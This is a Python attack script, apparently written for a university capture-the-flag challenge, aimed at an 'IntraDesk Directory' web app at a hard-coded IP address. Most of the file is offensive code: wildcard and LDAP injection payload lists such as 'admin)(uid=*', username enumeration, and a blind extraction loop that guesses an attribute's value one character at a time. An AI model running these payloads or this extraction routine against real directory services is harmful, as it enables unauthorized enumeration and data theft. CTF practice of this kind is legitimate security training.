#!/usr/bin/env python3
"""
IntraDesk Directory - LDAP Injection Exploit Attempts
CTF Challenge: UCL x KCL Friendly CTF

This script documents various LDAP injection techniques attempted.
"""

import requests
import string
import time

URL = "http://13.53.139.173/web1/"

def search(user, dept="All", office="Any"):
    """Perform a search and return the result count."""
    try:
        r = requests.get(URL, params={"user": user, "dept": dept, "office": office}, timeout=10)
        if "1 result" in r.text:
            return 1
        elif "0 result" in r.text:
            return 0
        else:
            return -1  # No result section (e.g., empty input)
    except Exception as e:
        print(f"Error: {e}")
        return -2

def test_wildcards():
    """Test various wildcard characters and encodings."""
    print("Testing wildcards...")
    wildcards = [
        "*",           # Standard LDAP wildcard
        "%",           # SQL LIKE wildcard
        "?",           # Single char wildcard
        "_",           # SQL single char wildcard
        ".",           # Regex any char
        ".*",          # Regex any chars
        "%2a",         # URL encoded asterisk
        "%252a",       # Double URL encoded
        "\\2a",        # LDAP hex escape
        "\\x2a",       # Hex escape
    ]
    
    for w in wildcards:
        result = search(w)
        print(f"  {repr(w)}: {result} result(s)")

def test_injection():
    """Test LDAP injection payloads."""
    print("\nTesting LDAP injection...")
    payloads = [
        "admin)(uid=*",
        "admin)(objectClass=*",
        "admin)(|(uid=admin)(uid=guest)",
        ")(uid=*",
        "*)(&",
        "admin)(&)(uid=guest",
    ]
    
    for p in payloads:
        result = search(p)
        print(f"  {repr(p)}: {result} result(s)")

def enumerate_users():
    """Enumerate possible usernames."""
    print("\nEnumerating users...")
    common_users = ["admin", "guest", "alice", "bob", "user", "test", "root", "flag", "secret"]
    found = []
    
    for user in common_users:
        if search(user) == 1:
            found.append(user)
            print(f"  FOUND: {user}")
    
    return found

def blind_extract(base_user="admin", attribute="description"):
    """Attempt blind LDAP extraction of an attribute."""
    print(f"\nAttempting blind extraction of {attribute} for {base_user}...")
    charset = string.ascii_letters + string.digits + "{}_-"
    extracted = ""
    
    for i in range(50):  # Max 50 characters
        found = False
        for c in charset:
            payload = f"{base_user})({attribute}={extracted}{c}*"
            result = search(payload)
            if result == 1:
                extracted += c
                print(f"  Extracted: {extracted}")
                found = True
                break
        if not found:
            break
    
    return extracted

if __name__ == "__main__":
    print("=" * 60)
    print("IntraDesk Directory - LDAP Injection Testing")
    print("=" * 60)
    
    # Test known users
    print("\nKnown users:")
    for user in ["admin", "guest", "alice"]:
        result = search(user)
        print(f"  {user}: {result} result(s)")
    
    # Run tests
    test_wildcards()
    test_injection()
    
    # Enumerate users
    found_users = enumerate_users()
    print(f"\nTotal users found: {found_users}")
    
    # Attempt blind extraction
    # Note: This likely won't work if injection is blocked
    # blind_extract("admin", "description")
    
    print("\n" + "=" * 60)
    print("Testing complete. Review results above.")
    print("=" * 60)
